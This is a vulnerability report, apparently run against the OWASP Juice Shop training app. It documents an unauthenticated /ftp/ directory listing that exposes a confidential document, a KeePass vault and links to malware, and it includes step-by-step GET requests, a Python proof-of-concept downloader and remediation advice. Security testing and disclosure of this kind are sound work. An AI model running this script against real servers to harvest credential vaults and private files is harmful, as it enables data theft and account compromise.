╭─ VULN-0003 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Unauthenticated Directory Listing and Sensitive File Download via    │
│  /ftp/ (KeePass Vault Exposure)                                              │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 7.5                                                             │
│                                                                              │
│  Target: http://juiceshop:3000                                               │
│                                                                              │
│  Endpoint: /ftp/, /ftp/acquisitions.md, /ftp/incident-support.kdbx,          │
│  /ftp/announcement_encrypted.md, /ftp/quarantine/                            │
│                                                                              │
│  Method: GET                                                                 │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                            │
│                                                                              │
│  Description                                                                 │
│  An information disclosure vulnerability was identified in the publicly      │
│  accessible /ftp/ directory. The server provides an unauthenticated HTML     │
│  directory index for /ftp/ and /ftp/quarantine/, allowing attackers to       │
│  enumerate and retrieve files directly over HTTP.\n\nThe exposed content     │
│  includes sensitive internal documents (e.g., a file explicitly marked       │
│  confidential) and a downloadable KeePass KDBX database                      │
│  (incident-support.kdbx). This materially increases the risk of credential   │
│  compromise, lateral movement, and broader system compromise if the KDBX     │
│  contains valid secrets.\n\nAdditionally, /ftp/quarantine/ is                │
│  directory-listed and contains downloadable .url shortcut files pointing to  │
│  external “juicy malware” binaries, which can facilitate social engineering  │
│  and malware distribution.                                                   │
│                                                                              │
│  Impact                                                                      │
│  Successful exploitation enables an unauthenticated attacker to:\n\nObtain   │
│  sensitive internal documents that may contain business or operational       │
│  information.\n\nDownload a KeePass vault (KDBX). If the vault can be        │
│  unlocked (weak password, reused password, offline cracking), the attacker   │
│  can recover credentials/API keys and potentially compromise accounts and    │
│  downstream systems.\n\nEnumerate and distribute quarantined .url shortcut   │
│  files that link to malware binaries, increasing the likelihood of end-user  │
│  compromise through phishing/social engineering.\n\nBusiness impact          │
│  includes loss of confidentiality of internal documents and elevated risk    │
│  of account takeover and secondary compromise due to exposed credential      │
│  storage artifacts.                                                          │
│                                                                              │
│  Technical Analysis                                                          │
│  The application exposes an HTTP-accessible directory at /ftp/ with          │
│  directory indexing enabled. No authentication or authorization is           │
│  enforced.\n\nEvidence confirms direct file retrieval is possible from the   │
│  listing, including files that are not safe for public access.\n\nObserved   │
│  behaviors:\n\nGET /ftp/ returns an HTML directory index enumerating         │
│  filenames and modification times.\n\nGET /ftp/acquisitions.md returns       │
│  sensitive content with explicit confidentiality marking.\n\nGET             │
│  /ftp/incident-support.kdbx returns an application/octet-stream download;    │
│  the response begins with the expected KDBX signature bytes (03 d9 a2 9a 67  │
│  fb 4b b5).\n\nGET /ftp/quarantine/ returns an HTML directory index;         │
│  entries include .url files which contain external URLs referencing malware  │
│  binaries.\n\nThe file-serving control is inconsistent with the UI/error     │
│  messaging (“Only .md and .pdf files are allowed!”), as the KDBX file is     │
│  still retrievable, indicating incomplete or bypassable extension            │
│  validation and/or mis-scoped routing rules.                                 │
│                                                                              │
│  PoC Description                                                             │
│  To reproduce:\n\n1. Without authenticating, request the FTP directory       │
│  listing:\n   GET http://juiceshop:3000/ftp/\n   Expected result: HTTP 200   │
│  with an HTML directory index.\n\n2. Download a sensitive document:\n   GET  │
│  http://juiceshop:3000/ftp/acquisitions.md\n   Expected result: HTTP 200     │
│  returning content including “This document is confidential! Do not          │
│  distribute!”.\n\n3. Download the credential vault:\n   GET                  │
│  http://juiceshop:3000/ftp/incident-support.kdbx\n   Expected result: HTTP   │
│  200 with Content-Type: application/octet-stream and binary content          │
│  starting with the KDBX header signature.\n\n4. Confirm quarantine           │
│  directory listing and .url contents:\n   GET                                │
│  http://juiceshop:3000/ftp/quarantine/\n   GET                               │
│  http://juiceshop:3000/ftp/quarantine/juicy_malware_linux_amd_64.url\n       │
│  Expected result: HTTP 200; .url file contains a URL to an external malware  │
│  binary.                                                                     │
│                                                                              │
│  PoC Code                                                                    │
│  import re\nimport sys\nfrom urllib.parse import urljoin\n\nimport           │
│  requests\n\nBASE = \"http://juiceshop:3000\"\n\n\ndef fetch(path: str) ->   │
│  requests.Response:\n    url = urljoin(BASE, path)\n    r =                  │
│  requests.get(url, timeout=15)\n    return r\n\n\ndef extract_links(html:    │
│  str):\n    # Very small parser for directory index links\n    return        │
│  sorted(set(re.findall(r'href=\"([^\"]+)\"', html)))\n\n\ndef main() ->      │
│  int:\n    # 1) Directory listing\n    r = fetch(\"/ftp/\")\n                │
│  print(\"/ftp/ status:\", r.status_code)\n    print(\"content-type:\",       │
│  r.headers.get(\"Content-Type\"))\n    if r.status_code != 200:\n            │
│  print(\"Unexpected response\")\n        return 1\n\n    links =             │
│  extract_links(r.text)\n    print(\"/ftp/ links (sample):\",                 │
│  links[:20])\n\n    # 2) Sensitive document\n    doc =                       │
│  fetch(\"/ftp/acquisitions.md\")\n    print(\"/ftp/acquisitions.md           │
│  status:\", doc.status_code)\n    print(\"snippet:\")\n                      │
│  print(doc.text[:250])\n\n    # 3) KeePass vault download and signature      │
│  check\n    kdbx = fetch(\"/ftp/incident-support.kdbx\")\n                   │
│  print(\"/ftp/incident-support.kdbx status:\", kdbx.status_code)\n           │
│  print(\"content-type:\", kdbx.headers.get(\"Content-Type\"))\n    head =    │
│  kdbx.content[:8]\n    # KDBX signature bytes: 03 d9 a2 9a 67 fb 4b b5\n     │
│  expected = bytes.fromhex(\"03d9a29a67fb4bb5\")\n    print(\"KDBX signature  │
│  matches:\", head == expected)\n    print(\"first 16 bytes:\",               │
│  kdbx.content[:16].hex())\n\n    # 4) Quarantine listing + .url file\n    q  │
│  = fetch(\"/ftp/quarantine/\")\n    print(\"/ftp/quarantine/ status:\",      │
│  q.status_code)\n    if q.status_code == 200 and \"listing directory\" in    │
│  q.text.lower():\n        qlinks = extract_links(q.text)\n        url_files  │
│  = [x for x in qlinks if x.lower().endswith(\".url\")]\n                     │
│  print(\"quarantine .url files:\", url_files[:10])\n        if url_files:\n  │
│  u = fetch(\"/ftp/quarantine/\" + url_files[0])\n            print(\"sample  │
│  .url status:\", u.status_code)\n            print(\"sample .url             │
│  content:\")\n            print(u.text[:300])\n\n    return 0\n\n\nif        │
│  __name__ == \"__main__\":\n    raise SystemExit(main())                     │
│                                                                              │
│  Remediation                                                                 │
│  1. Disable directory listing for /ftp/ and /ftp/quarantine/.\n\n2. Enforce  │
│  authentication and authorization on any file browsing/download              │
│  functionality; restrict access to only intended users/roles.\n\n3. Remove   │
│  sensitive artifacts from web-accessible directories, especially credential  │
│  databases (e.g., *.kdbx), backups (*.bak), compiled artifacts (*.pyc), and  │
│  configuration files.\n\n4. Implement strict server-side allowlisting for    │
│  downloadable content types and extensions, ensuring controls apply          │
│  uniformly to all file routes (including nested directories).\n\n5. Add      │
│  security monitoring and alerting for access to sensitive file paths and     │
│  anomalous file download activity.\n\n6. Review CORS configuration for       │
│  file-serving responses; do not allow cross-origin access to privileged or   │
│  sensitive resources unless explicitly required.                             │
